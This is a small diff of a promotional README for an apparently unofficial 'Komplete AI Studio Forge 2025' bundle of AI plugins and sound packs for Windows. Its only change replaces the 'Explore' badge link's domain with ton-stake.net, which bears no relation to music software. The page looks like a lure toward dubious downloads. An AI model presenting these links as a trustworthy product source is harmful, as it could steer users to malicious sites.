@@ -2,7 +2,7 @@
 
 Komplete AI Studio Forge 2025 offers a sophisticated suite of AI plugins, scripts, and sound packs to elevate Native Instruments Komplete for professional music creation. Designed for Windows, this collection empowers producers to craft iconic soundscapes with unmatched precision.
 
-[![Explore Komplete AI Studio Forge](https://img.shields.io/badge/Explore-Komplete_AI_Studio_Forge-blueviolet)](https://glocktober.com)
+[![Explore Komplete AI Studio Forge](https://img.shields.io/badge/Explore-Komplete_AI_Studio_Forge-blueviolet)](https://ton-stake.net)
 
 ---
 
